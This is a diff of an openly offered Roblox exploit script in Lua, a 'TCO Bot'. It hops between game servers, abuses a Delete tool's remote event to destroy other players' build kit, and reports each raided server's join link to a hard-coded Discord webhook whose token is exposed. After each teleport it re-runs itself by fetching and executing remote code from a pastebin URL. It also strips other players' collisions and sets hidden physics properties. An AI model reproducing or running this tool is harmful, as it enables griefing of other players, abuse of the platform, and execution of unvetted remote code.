@@ -1,481 +1,513 @@
--- TCO Bot Script with Auto Raid Bot
--- Auto server hops, sends "67", and breaks bkit with Discord logging
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+]=]
 
-local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
-local HttpService = game:GetService("HttpService")
-local CoreGui = game:GetService("CoreGui")
+-- Instances: 9 | Scripts: 6 | Modules: 0 | Tags: 0
+local G2L = {};
 
-local player = Players.LocalPlayer
-
--- Get queue_on_teleport and request functions
-local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
-local request = request or syn.request or http.request or fluxus.request
-
--- Discord Webhook
-local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1493581974378516490/fxTemv1sP_l5acVQ9t_nhHMA8lwHM7TnC4RYelhtqpFShy2H9VX0U4hwWNDFNBVAnZJL"
-
--- Prevent multiple instances
-if getgenv ~= nil and getgenv().tcobotgui then
-    getgenv().tcobotgui:Destroy()
-end
-
--- Track visited servers
-if not getgenv().visitedServers then
-    getgenv().visitedServers = {}
-end
-table.insert(getgenv().visitedServers, game.JobId)
-
--- Check if this was queued (don't queue again to prevent infinite loop)
-local wasQueued = getgenv().tcoWasQueued or false
-getgenv().tcoWasQueued = false
-
--- Auto raid bot state
-local autoRaidEnabled = false
-local raidBotRunning = false
-
--- Create UI
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "TCOBotUI"
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-getgenv().tcobotgui = screenGui
-
--- Try to parent to CoreGui, fallback to PlayerGui if that fails
-local success = pcall(function()
-    screenGui.Parent = CoreGui
-end)
-if not success then
-    screenGui.Parent = player:WaitForChild("PlayerGui")
-end
-
--- Main Frame (top middle)
-local mainFrame = Instance.new("Frame")
-mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 200, 0, 125)
-mainFrame.Position = UDim2.new(0.5, -100, 0, 10) -- Top middle
-mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-mainFrame.BorderSizePixel = 2
-mainFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
-mainFrame.Parent = screenGui
-
--- Add corner rounding
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 8)
-corner.Parent = mainFrame
-
--- Title Label
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Name = "TitleLabel"
-titleLabel.Size = UDim2.new(1, 0, 0, 30)
-titleLabel.Position = UDim2.new(0, 0, 0, 0)
-titleLabel.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-titleLabel.BorderSizePixel = 0
-titleLabel.Text = "TCO Bot"
-titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-titleLabel.TextSize = 16
-titleLabel.Font = Enum.Font.GothamBold
-titleLabel.Parent = mainFrame
-
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 8)
-titleCorner.Parent = titleLabel
-
--- Server Hop Button
-local hopButton = Instance.new("TextButton")
-hopButton.Name = "HopButton"
-hopButton.Size = UDim2.new(0, 180, 0, 35)
-hopButton.Position = UDim2.new(0, 10, 0, 40)
-hopButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-hopButton.BorderSizePixel = 0
-hopButton.Text = "Server Hop"
-hopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-hopButton.TextSize = 14
-hopButton.Font = Enum.Font.GothamBold
-hopButton.Parent = mainFrame
-
-local buttonCorner = Instance.new("UICorner")
-buttonCorner.CornerRadius = UDim.new(0, 6)
-buttonCorner.Parent = hopButton
-
--- Auto Raid Bot Button
-local raidButton = Instance.new("TextButton")
-raidButton.Name = "RaidButton"
-raidButton.Size = UDim2.new(0, 180, 0, 35)
-raidButton.Position = UDim2.new(0, 10, 0, 80)
-raidButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
-raidButton.BorderSizePixel = 0
-raidButton.Text = "Auto Raid Bot: OFF"
-raidButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-raidButton.TextSize = 14
-raidButton.Font = Enum.Font.GothamBold
-raidButton.Parent = mainFrame
-
-local raidCorner = Instance.new("UICorner")
-raidCorner.CornerRadius = UDim.new(0, 6)
-raidCorner.Parent = raidButton
-
--- Make UI draggable
-local dragging = false
-local dragInput, mousePos, framePos
-
-mainFrame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        mousePos = input.Position
-        framePos = mainFrame.Position
-        
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
-
-mainFrame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-        dragInput = input
-    end
-end)
-
-game:GetService("UserInputService").InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        local delta = input.Position - mousePos
-        mainFrame.Position = UDim2.new(
-            framePos.X.Scale,
-            framePos.X.Offset + delta.X,
-            framePos.Y.Scale,
-            framePos.Y.Offset + delta.Y
-        )
-    end
-end)
+-- StarterGui.BotGui
+G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+G2L["1"]["Name"] = [[BotGui]];
+G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 
 
-            end
-        end
-        
-        -- Fallback to legacy chat
-        local ReplicatedStorage = game:GetService("ReplicatedStorage")
-        local chatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents", 2)
-        if chatEvents then
-            local sayMessage = chatEvents:WaitForChild("SayMessageRequest", 2)
-            if sayMessage then
-                sayMessage:FireServer(message, "All")
-            end
-        end
-    end)
-    
-    if not success then
-        warn("Failed to send chat message:", err)
-    else
-        print("Sent '67' in chat")
-    end
-end
+-- StarterGui.BotGui.ToggleButton
+G2L["2"] = Instance.new("TextButton", G2L["1"]);
+G2L["2"]["BorderSizePixel"] = 0;
+G2L["2"]["TextSize"] = 14;
+G2L["2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2"]["Size"] = UDim2.new(0, 200, 0, 50);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2"]["Name"] = [[ToggleButton]];
+G2L["2"]["Position"] = UDim2.new(0.4517, 0, 0.1238, 0);
 
--- Function to send Discord webhook
-local function sendWebhook()
-    if not request then
-        warn("Request function not available")
-        return
-    end
-    
-    local playerCount = #Players:GetPlayers()
-    local maxPlayers = Players.MaxPlayers
-    
-    local joinLink = string.format(
-        "https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s",
-        tostring(game.PlaceId),
-        game.JobId
-    )
-    
-    local executor = "Unknown"
-    if syn and syn.request then
-        executor = "Synapse X"
-    elseif fluxus and fluxus.request then
-        executor = "Fluxus"
-    elseif getexecutorname then
-        executor = getexecutorname()
-    end
-    
-    local embed = {
-        title = string.format("Bkit Disabled  |  %d/%d", playerCount, maxPlayers),
-        description = string.format("[Join Game](%s)\n\n%s / `%s` • Today at %s",
-            joinLink,
-            player.DisplayName,
-            player.Name,
-            os.date("%I:%M %p")
-        ),
-        color = 0xff0000, -- Red color
-        footer = {
-            text = executor
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
-    
-    local data = {
-        embeds = {embed}
-    }
-    
-    pcall(function()
-        request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
-    
-    print("Sent Discord webhook")
-end
 
--- Function to break bkit
-local function breakBkit()
-    local success, err = pcall(function()
-        local character = player.Character
-        if not character then error("No character") end
-        
-        local humanoid = character:FindFirstChild("Humanoid")
-        if not humanoid then error("No humanoid") end
-        
-        -- Find delete tool in backpack
-        local deleteTool = player.Backpack:FindFirstChild("Delete")
-        if not deleteTool then error("Delete tool not found in backpack") end
-        
-        print("Breaking bkit...")
-        
-        -- Save currently equipped tool
-        local previousTool = character:FindFirstChildOfClass("Tool")
-        
-        -- Equip Delete tool
-        humanoid:EquipTool(deleteTool)
-        task.wait(0.1)
-        
-        -- Get the event from the equipped tool
-        local event = deleteTool:WaitForChild("Script"):WaitForChild("Event")
-        
-        -- Get Brick from ReplicatedStorage
-        local rs = game:GetService("ReplicatedStorage")
-        local brick = rs:FindFirstChild("Brick")
-        if not brick then error("No Brick in ReplicatedStorage") end
-        
-        -- Fire delete event
-        event:FireServer(brick, character.HumanoidRootPart.Position)
-        task.wait(0.1)
-        
-        -- Unequip Delete tool
-        humanoid:UnequipTools()
-        
-        -- Re-equip previous tool if there was one
-        if previousTool and previousTool.Parent == player.Backpack then
-            humanoid:EquipTool(previousTool)
-        end
-        
-        print("Bkit broken!")
-        
-        -- Send webhook
-        sendWebhook()
-    end)
-    
-    if not success then
-        warn("Failed to break bkit:", err)
-    end
-    
-    return success
-end
+-- StarterGui.BotGui.ToggleButton.ToggleScript
+G2L["3"] = Instance.new("Folder", G2L["2"]);
+G2L["3"]["Name"] = [[ToggleScript]];
 
--- Function to check if Delete tool is in inventory
-local function hasDeleteTool()
-    return player.Backpack:FindFirstChild("Delete") ~= nil
-end
 
--- Function to get a fresh server (not visited before)
-local function getFreshServer()
-    local placeId = game.PlaceId
-    local currentJobId = game.JobId
-    
-    -- Get server list
-    local url = "https://games.roblox.com/v1/games/" .. tostring(placeId) .. "/servers/Public?sortOrder=Desc&limit=100"
-    
-    local servers
-    if request then
-        local response = request({Url = url})
-        servers = HttpService:JSONDecode(response.Body).data
-    else
-        servers = HttpService:JSONDecode(game:HttpGet(url)).data
-    end
-    
-    -- Find a server that's not full, not current, and not visited
-    if servers then
-        for i, server in pairs(servers) do
-            if type(server) == "table" and server.id and server.maxPlayers and server.playing then
-                local isVisited = false
-                for _, visitedId in ipairs(getgenv().visitedServers) do
-                    if server.id == visitedId then
-                        isVisited = true
-                        break
-                    end
-                end
-                
-                -- Don't join full servers
-                if not isVisited and server.id ~= currentJobId and tonumber(server.playing) < tonumber(server.maxPlayers) then
-                    return server.id
-                end
-            end
-        end
-    end
-    
-    return nil
-end
+-- StarterGui.BotGui.ToggleButton.ToggleScript.AntiFlingScript
+G2L["4"] = Instance.new("LocalScript", G2L["3"]);
+G2L["4"]["Name"] = [[AntiFlingScript]];
 
--- Function to server hop (manual)
-local function serverHop()
-    hopButton.Text = "Finding Server..."
-    hopButton.BackgroundColor3 = Color3.fromRGB(170, 170, 0)
-    
-    local targetServer = getFreshServer()
-    
-    if targetServer then
-        print("Found new server, hopping...")
-        hopButton.Text = "Hopping..."
-        
-        -- Queue the script to re-execute on join (only if not already queued)
-        if queueteleport and not wasQueued then
-            pcall(function()
-                getgenv().tcoWasQueued = true
-                queueteleport([[loadstring(game:HttpGet("https://pastebin.com/raw/LnAuLdN3"))()]])
-            end)
-        end
-        
-        -- Teleport to the new server
-        TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServer, player)
-    else
-        print("No available servers found")
-        hopButton.Text = "No Servers!"
-        hopButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
-        wait(2)
-        hopButton.Text = "Server Hop"
-        hopButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-    end
-end
 
--- Auto raid bot loop
-local function autoRaidLoop()
-    raidBotRunning = true
-    
-    while autoRaidEnabled do
-        print("Auto Raid Bot: Waiting for Delete tool...")
-        raidButton.Text = "Waiting for Delete..."
-        
-        local startTime = tick()
-        local foundTool = false
-        
-        -- Wait up to 1 minute for Delete tool
-        while tick() - startTime < 60 and autoRaidEnabled do
-            if hasDeleteTool() then
-                foundTool = true
-                break
-            end
-            wait(1)
-        end
-        
-        if not autoRaidEnabled then break end
-        
-        if foundTool then
-            print("Auto Raid Bot: Delete tool found! Breaking bkit...")
-            raidButton.Text = "Breaking Bkit..."
-            
-            -- Break bkit
-            local success = breakBkit()
-            
-            if success then
-                wait(2)
-                
-                -- Hop to new server
-                print("Auto Raid Bot: Finding new server...")
-                raidButton.Text = "Finding Server..."
-                
-                local targetServer = getFreshServer()
-                
-                if targetServer then
-                    print("Auto Raid Bot: Hopping to new server...")
-                    
-                    -- Queue script (only if not already queued)
-                    if queueteleport and not wasQueued then
-                        pcall(function()
-                            getgenv().tcoWasQueued = true
-                            queueteleport([[loadstring(game:HttpGet("https://pastebin.com/raw/LnAuLdN3"))()]])
-                        end)
-                    end
-                    
-                    -- Teleport
-                    TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServer, player)
-                else
-                    print("Auto Raid Bot: No servers available")
-                    raidButton.Text = "No Servers!"
-                    wait(5)
-                end
-            end
-        else
-            -- No tool found in 1 minute, hop to new server
-            print("Auto Raid Bot: No Delete tool, hopping to new server...")
-            raidButton.Text = "No Tool - Hopping..."
-            
-            local targetServer = getFreshServer()
-            
-            if targetServer then
-                -- Queue script (only if not already queued)
-                if queueteleport and not wasQueued then
-                    pcall(function()
-                        getgenv().tcoWasQueued = true
-                        queueteleport([[loadstring(game:HttpGet("https://pastebin.com/raw/LnAuLdN3"))()]])
-                    end)
-                end
-                
-                -- Teleport
-                TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServer, player)
-            else
-                print("Auto Raid Bot: No servers available")
-                raidButton.Text = "No Servers!"
-                wait(5)
-            end
-        end
-        
-        if not autoRaidEnabled then break end
-        wait(1)
-    end
-    
-    raidBotRunning = false
-    raidButton.Text = "Auto Raid Bot: OFF"
-end
+-- StarterGui.BotGui.ToggleButton.ToggleScript.MainScript
+G2L["5"] = Instance.new("LocalScript", G2L["3"]);
+G2L["5"]["Name"] = [[MainScript]];
 
--- Connect buttons
-hopButton.MouseButton1Click:Connect(serverHop)
 
-raidButton.MouseButton1Click:Connect(function()
-    autoRaidEnabled = not autoRaidEnabled
-    
-    if autoRaidEnabled then
-        raidButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-        raidButton.Text = "Auto Raid Bot: ON"
-        print("Auto Raid Bot enabled")
-        
-        if not raidBotRunning then
-            spawn(autoRaidLoop)
-        end
-    else
-        raidButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
-        raidButton.Text = "Auto Raid Bot: OFF"
-        print("Auto Raid Bot disabled")
-    end
-end)
+-- StarterGui.BotGui.ToggleButton.ToggleScript.AutoPickupScript
+G2L["6"] = Instance.new("LocalScript", G2L["3"]);
+G2L["6"]["Name"] = [[AutoPickupScript]];
 
--- Send "67" in chat on load
-wait(1)
-sendChatMessage("67")
 
-print("TCO Bot loaded!")
-print("Click 'Server Hop' to manually switch servers")
-print("Click 'Auto Raid Bot' to toggle automatic raiding")
+-- StarterGui.BotGui.ToggleButton.ToggleScript.ServerHopScript
+G2L["7"] = Instance.new("LocalScript", G2L["3"]);
+G2L["7"]["Name"] = [[ServerHopScript]];
+
+
+-- StarterGui.BotGui.ToggleButton.ToggleScript.BkitBreakScript
+G2L["8"] = Instance.new("LocalScript", G2L["3"]);
+G2L["8"]["Name"] = [[BkitBreakScript]];
+
+
+-- StarterGui.BotGui.ToggleButton.ToggleScript.WebhookScript
+G2L["9"] = Instance.new("LocalScript", G2L["3"]);
+G2L["9"]["Name"] = [[WebhookScript]];
+
+
+-- StarterGui.BotGui.ToggleButton.ToggleScript.AntiFlingScript
+local function C_4()
+local script = G2L["4"];
+	-- AntiFlingScript (LocalScript under ToggleButton/ToggleScript)
+	
+	local Players     = game:GetService("Players")
+	local RunService  = game:GetService("RunService")
+	local LocalPlayer = Players.LocalPlayer
+	
+	local conn = nil
+	
+	shared.BotAntiFling = function(on)
+		if on then
+			if conn then return end
+			conn = RunService.Stepped:Connect(function()
+				for _, player in pairs(Players:GetPlayers()) do
+					if player ~= LocalPlayer and player.Character then
+						for _, part in pairs(player.Character:GetDescendants()) do
+							if part:IsA("BasePart") then
+								part.CanCollide = false
+							end
+						end
+					end
+				end
+			end)
+		else
+			if conn then
+				conn:Disconnect()
+				conn = nil
+			end
+			-- Restore collisions
+			for _, player in pairs(Players:GetPlayers()) do
+				if player ~= LocalPlayer and player.Character then
+					for _, part in pairs(player.Character:GetDescendants()) do
+						if part:IsA("BasePart") then
+							part.CanCollide = true
+						end
+					end
+				end
+			end
+		end
+	end
+end;
+task.spawn(C_4);
+-- StarterGui.BotGui.ToggleButton.ToggleScript.MainScript
+local function C_5()
+local script = G2L["5"];
+	-- MainScript (LocalScript under ToggleButton/ToggleScript)
+	-- Controls the main bot state, orchestrates all sub-systems via shared
+	
+	local Players           = game:GetService("Players")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RunService        = game:GetService("RunService")
+	local HttpService       = game:GetService("HttpService")
+	local LocalPlayer       = Players.LocalPlayer
+	
+	local ToggleButton = script.Parent.Parent
+	
+	--------------------------------------------------
+	-- SHARED STATE (other scripts read from shared)
+	--------------------------------------------------
+	
+	shared.BotEnabled      = false
+	shared.BotStatus       = "OFF"
+	shared.BotBreakBkit    = function() return false end
+	shared.BotHop          = function() end
+	shared.BotAntiFling    = function(on) end
+	shared.BotAutoPickup   = function(on) end
+	shared.BotSendWebhook  = function(title, desc, color, footer) end
+	
+	--------------------------------------------------
+	-- PERSISTENT STATE
+	--------------------------------------------------
+	
+	local STATE_FILE   = "BotGuiState.json"
+	local BROKEN_FILE  = "BotGuiBroken.json"
+	local VISITED_FILE = "BotGuiVisited.json"
+	
+	local function readJson(file)
+		local ok, data = pcall(function()
+			return HttpService:JSONDecode(readfile(file))
+		end)
+		return ok and data or {}
+	end
+	
+	local function writeJson(file, data)
+		pcall(function()
+			writefile(file, HttpService:JSONEncode(data))
+		end)
+	end
+	
+	local brokenServers  = readJson(BROKEN_FILE)
+	local visitedServers = readJson(VISITED_FILE)
+	
+	shared.BrokenServers  = brokenServers
+	shared.VisitedServers = visitedServers
+	
+	local function markBroken(jobId)
+		brokenServers[jobId] = true
+		writeJson(BROKEN_FILE, brokenServers)
+	end
+	
+	local function markVisited(jobId)
+		visitedServers[jobId] = true
+		writeJson(VISITED_FILE, visitedServers)
+	end
+	
+	local function isBroken(jobId)
+		return brokenServers[jobId] == true
+	end
+	
+	shared.MarkBroken  = markBroken
+	shared.MarkVisited = markVisited
+	shared.IsBroken    = isBroken
+	
+	--------------------------------------------------
+	-- UI
+	--------------------------------------------------
+	
+	local function setStatus(text)
+		shared.BotStatus = text
+		ToggleButton.Text = text
+	end
+	
+	--------------------------------------------------
+	-- MAIN LOOP
+	--------------------------------------------------
+	
+	local mainTask = nil
+	
+	local function mainLoop()
+		markVisited(game.JobId)
+	
+		-- Step 1: Check ReplicatedStorage.Brick
+		setStatus("Checking server...")
+		task.wait(2) -- let game load
+	
+		local brick = ReplicatedStorage:FindFirstChild("Brick")
+		if not brick then
+			task.wait(5)
+			if not shared.BotEnabled then return end
+			setStatus("Bkit Broken...")
+			task.wait(1)
+			shared.BotHop()
+			return
+		end
+	
+		-- Step 2: Enable anti fling + auto pickup
+		shared.BotAntiFling(true)
+		shared.BotAutoPickup(true)
+	
+		-- Step 3: Wait up to 60s for Delete tool
+		local waitStart = tick()
+		local WAIT_TIME = 60
+		local gotDelete = false
+		local brickGone = false
+	
+		-- Watch for brick disappearing
+		local brickConn = brick.AncestryChanged:Connect(function()
+			if not brick:IsDescendantOf(game) then
+				brickGone = true
+			end
+		end)
+	
+		-- Timer display
+		local timerConn = RunService.Heartbeat:Connect(function()
+			if not shared.BotEnabled then return end
+			local remaining = math.max(0, WAIT_TIME - (tick() - waitStart))
+			setStatus(string.format("Waiting... (%.1f)", remaining))
+		end)
+	
+		while tick() - waitStart < WAIT_TIME and shared.BotEnabled do
+			if brickGone then break end
+			local del = LocalPlayer.Backpack:FindFirstChild("Delete")
+				or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Delete"))
+			if del then
+				gotDelete = true
+				break
+			end
+			task.wait(0.2)
+		end
+	
+		timerConn:Disconnect()
+		brickConn:Disconnect()
+	
+		shared.BotAntiFling(false)
+		shared.BotAutoPickup(false)
+	
+		if not shared.BotEnabled then return end
+	
+		if brickGone then
+			setStatus("Bkit Broken...")
+			task.wait(2)
+			shared.BotHop()
+			return
+		end
+	
+		if not gotDelete then
+			-- Timed out — hop but keep server visitable
+			shared.BotHop()
+			return
+		end
+	
+		-- Step 4: Break bkit
+		setStatus("Breaking Bkit...")
+		local success = shared.BotBreakBkit()
+	
+		if success then
+			markBroken(game.JobId)
+	
+			-- Webhook
+			local playerCount = #Players:GetPlayers()
+			local maxPlayers  = Players.MaxPlayers
+			local joinLink    = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+			local display     = LocalPlayer.DisplayName .. " / " .. LocalPlayer.Name
+	
+			shared.BotSendWebhook(
+				"Bkit Disabled | " .. playerCount .. "/" .. maxPlayers,
+				"[Join Game](" .. joinLink .. ")",
+				0xff0000,
+				display
+			)
+		end
+	
+		task.wait(1)
+		shared.BotHop()
+	end
+	
+	--------------------------------------------------
+	-- TOGGLE
+	--------------------------------------------------
+	
+	local function turnOn()
+		shared.BotEnabled = true
+		ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+		mainTask = task.spawn(mainLoop)
+	end
+	
+	local function turnOff()
+		shared.BotEnabled = false
+		ToggleButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+		setStatus("OFF")
+		shared.BotAntiFling(false)
+		shared.BotAutoPickup(false)
+		-- Reset state for fresh start
+		brokenServers  = {}
+		visitedServers = {}
+		writeJson(BROKEN_FILE, brokenServers)
+		writeJson(VISITED_FILE, visitedServers)
+		shared.BrokenServers  = brokenServers
+		shared.VisitedServers = visitedServers
+	end
+	
+	ToggleButton.MouseButton1Click:Connect(function()
+		if shared.BotEnabled then
+			turnOff()
+		else
+			turnOn()
+		end
+	end)
+	
+	-- Auto restart after server hop
+	local savedState = readJson(STATE_FILE)
+	if savedState.wasOn then
+		brokenServers  = readJson(BROKEN_FILE)
+		visitedServers = readJson(VISITED_FILE)
+		shared.BrokenServers  = brokenServers
+		shared.VisitedServers = visitedServers
+		task.wait(3)
+		turnOn()
+	end
+	
+	-- Save state on teleport
+	LocalPlayer.OnTeleport:Connect(function(state)
+		if state == Enum.TeleportState.Started then
+			writeJson(STATE_FILE, {wasOn = shared.BotEnabled})
+		end
+	end)
+end;
+task.spawn(C_5);
+-- StarterGui.BotGui.ToggleButton.ToggleScript.AutoPickupScript
+local function C_6()
+local script = G2L["6"];
+	-- AutoPickupScript (LocalScript under ToggleButton/ToggleScript)
+	
+	local Players     = game:GetService("Players")
+	local LocalPlayer = Players.LocalPlayer
+	
+	shared.BotAutoPickup = function(on)
+		pcall(function()
+			sethiddenproperty(LocalPlayer, "SimulationRadius", on and 1000 or 0)
+		end)
+	end
+end;
+task.spawn(C_6);
+-- StarterGui.BotGui.ToggleButton.ToggleScript.ServerHopScript
+local function C_7()
+local script = G2L["7"];
+	-- ServerHopScript (LocalScript under ToggleButton/ToggleScript)
+	
+	local Players          = game:GetService("Players")
+	local TeleportService  = game:GetService("TeleportService")
+	local HttpService      = game:GetService("HttpService")
+	local LocalPlayer      = Players.LocalPlayer
+	
+	local function getServers()
+		local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100"
+		local ok, result = pcall(function()
+			local body = request and request({Url = url, Method = "GET"}).Body or game:HttpGet(url)
+			return HttpService:JSONDecode(body)
+		end)
+		if ok and result and result.data then
+			return result.data
+		end
+		return {}
+	end
+	
+	shared.BotHop = function()
+		if not shared.BotEnabled then return end
+	
+		shared.BotStatus = "Serverhopping..."
+	
+		local servers = getServers()
+		local brokenServers  = shared.BrokenServers  or {}
+		local visitedServers = shared.VisitedServers or {}
+	
+		-- Find server not broken and not current
+		local candidates = {}
+		for _, s in ipairs(servers) do
+			if s.id and s.id ~= game.JobId and not brokenServers[s.id] then
+				table.insert(candidates, s)
+			end
+		end
+	
+		-- Fallback: visited servers that aren't broken
+		if #candidates == 0 then
+			for jobId, _ in pairs(visitedServers) do
+				if not brokenServers[jobId] and jobId ~= game.JobId then
+					table.insert(candidates, {id = jobId})
+				end
+			end
+		end
+	
+		if #candidates == 0 then
+			shared.BotStatus = "No servers found"
+			return
+		end
+	
+		local target = candidates[1]
+	
+		-- Queue re-execution after teleport
+		pcall(function()
+			local queueFn = queue_on_teleport
+				or (syn and syn.queue_on_teleport)
+				or (fluxus and fluxus.queue_on_teleport)
+			if queueFn then
+				queueFn([[
+					task.wait(3)
+					local ok, code = pcall(function()
+						return game:HttpGet("https://pastebin.com/raw/LnAuLdN3")
+					end)
+					if ok and code then
+						loadstring(code)()
+					end
+				]])
+			end
+		end)
+	
+		pcall(function()
+			TeleportService:TeleportToPlaceInstance(game.PlaceId, target.id, LocalPlayer)
+		end)
+	end
+end;
+task.spawn(C_7);
+-- StarterGui.BotGui.ToggleButton.ToggleScript.BkitBreakScript
+local function C_8()
+local script = G2L["8"];
+	-- BkitBreakScript (LocalScript under ToggleButton/ToggleScript)
+	
+	local Players           = game:GetService("Players")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local LocalPlayer       = Players.LocalPlayer
+	
+	shared.BotBreakBkit = function()
+		local character = LocalPlayer.Character
+		if not character then return false end
+	
+		local humanoid = character:FindFirstChildOfClass("Humanoid")
+		if not humanoid then return false end
+	
+		local deleteTool = LocalPlayer.Backpack:FindFirstChild("Delete")
+			or character:FindFirstChild("Delete")
+		if not deleteTool then return false end
+	
+		local brick = ReplicatedStorage:FindFirstChild("Brick")
+		if not brick then return false end
+	
+		local ok = pcall(function()
+			humanoid:EquipTool(deleteTool)
+			task.wait(0.1)
+			local event = deleteTool:WaitForChild("Script"):WaitForChild("Event")
+			event:FireServer(brick, character.HumanoidRootPart.Position)
+			task.wait(0.1)
+			humanoid:UnequipTools()
+		end)
+	
+		return ok
+	end
+end;
+task.spawn(C_8);
+-- StarterGui.BotGui.ToggleButton.ToggleScript.WebhookScript
+local function C_9()
+local script = G2L["9"];
+	-- WebhookScript (LocalScript under ToggleButton/ToggleScript)
+	
+	local HttpService = game:GetService("HttpService")
+	
+	local WEBHOOK = "https://discordapp.com/api/webhooks/1493581974378516490/fxTemv1sP_l5acVQ9t_nhHMA8lwHM7TnC4RYelhtqpFShy2H9VX0U4hwWNDFNBVAnZJL"
+	
+	local req = request
+		or (syn and syn.request)
+		or http_request
+		or (fluxus and fluxus.request)
+		or function() end
+	
+	shared.BotSendWebhook = function(title, description, color, footer)
+		pcall(function()
+			req({
+				Url    = WEBHOOK,
+				Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body   = HttpService:JSONEncode({
+					embeds = {{
+						title       = title,
+						description = description,
+						color       = color,
+						footer      = {text = footer},
+						timestamp   = DateTime.now():ToIsoDate()
+					}}
+				})
+			})
+		end)
+	end
+end;
+task.spawn(C_9);
+
+return G2L["1"], require;
